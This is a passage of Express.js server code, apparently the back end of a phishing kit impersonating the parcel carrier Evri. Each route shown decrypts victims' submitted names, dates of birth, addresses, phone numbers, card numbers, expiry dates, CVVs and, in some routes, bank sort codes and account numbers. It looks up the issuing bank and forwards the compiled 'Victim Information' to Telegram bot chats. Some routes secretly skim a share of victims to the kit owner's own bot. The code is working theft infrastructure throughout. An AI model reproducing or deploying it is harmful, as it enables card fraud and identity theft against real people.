            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriSYM:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 1713673720,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        saim += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/nchroEvri", cors());

app.post("/nchroEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (nchroCount == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        nchroCount = 5;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriNchro:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 956029722,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        saim += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/cbEvri", cors());

app.post("/cbEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: "-626303583",
            text: `Evri:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });

      res.send("Update Completed");
    });
});

app.options("/eggmanEvri", cors());

app.post("/eggmanEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        binL = `${bin} | ${resp.data.scheme} | ${resp.data.type} | ${resp.data.brand} | ${resp.data.bank.name}`;
      }
    })
    .then(function () {
      var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binL}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\nUser Agent: ${userAgent}`;

      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: 680379375,
            text: `EvriTriz:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      // axios
      //   .post(
      //     `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
      //     {
      //       chat_id: 5392091446,
      //       text: `Evri:\n${originalText}`,
      //       parse_mode: "Markdown",
      //     }
      //   )
      //   .catch((e) => {
      //     console.log(e);
      //   });

      res.send("Update Completed");
    });
});

app.options("/usufEvri", cors());

app.post("/usufEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
      binInfo = resp.data;
    })
    .then(function () {
      if (binInfo.country.alpha2 == "GB") {
        var binList = `${bin} | ${binInfo.scheme} | ${binInfo.type} | ${binInfo.brand} | ${bankName}`;
        var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;

        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-722187158",
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        binList = "";
        res.send("Update Completed");
      } else {
        res.send("Suck ur mum");
      }
    });
});

app.options("/trizEvri1", cors());

app.post("/trizEvri1", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
      binInfo = resp.data;
    })
    .then(function () {
      if (binInfo.country.alpha2 == "GB") {
        var binList = `${bin} | ${binInfo.scheme} | ${binInfo.type} | ${binInfo.brand} | ${bankName}`;
        var originalText = `-------------------------------------------------------------------------\nBilling Information\n|Full Name: ${fname}\n|DOB: ${dob}\n|Address: ${address}\n|Post Code: ${pcode}\n|Telephone: ${telephone}\n-------------------------------------------------------------------------\nCard Information\n|Card Number: ${ccnum}\n|Card Expiry: ${ccexp}\n|CVV: ${cvv}\n|Bin: ${binList}\n-------------------------------------------------------------------------\n+ Victim Information\n| IP Address : ${ip}\n| UserAgent : ${userAgent}`;

        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-764686477",
              text: `EvriTriz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        binList = "";
        res.send("Update Completed");
      } else {
        res.send("Suck ur mum");
      }
    });
});

let kyle = 0;

app.options("/kyleEvri", cors());

app.post("/kyleEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (kyle == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kyle = 5;
      } else if (bin === "542011") {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriSYM:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5332696640,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        kyle += 1;
      }

      res.send("Update Completed");
    });
});

let mk = 0;

app.options("/mkEvri", cors());

app.post("/mkEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (mk == 7) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        mk = 0;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriMK:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-783389982",
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        mk += 1;
      }

      res.send("Update Completed");
    });
});

let chasingfunds = 0;

app.options("/chasingfundsEvri", cors());

app.post("/chasingfundsEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (chasingfunds == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        chasingfunds = 0;
      } else {
        if (bin === "542011") {
          axios.post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          );
        } else {
          axios.post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriChasing:\n${originalText}`
          );
          axios.post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=864072421&text=Evri:\n${originalText}`
          );
        }
        chasingfunds += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/@skiii719", cors());

app.post("/@skiii719", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (skiii719 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        skiii719 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=Evriskiii719:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5334039930&text=Evri:\n${originalText}`
        );
        skiii719 += 1;
      }

      res.send("Update Completed");
    });
});

let F_zn66 = 0;

app.options("/F_zn66", cors());

app.post("/F_zn66", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (F_zn66 == 7) {
        axios.post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
        );
        F_zn66 = 0;
      } else {
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFZ:\n${originalText}`
        );
        axios.post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1612469030&text=Evri:\n${originalText}`
        );
        F_zn66 += 1;
      }

      res.send("Update Completed");
    });
});

let timesz = 0;

app.options("/timeszEvri", cors());

app.post("/timeszEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  // scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  // accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
  //   CryptoJS.enc.Utf8
  // );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (timesz == 7) {
        axios.post(
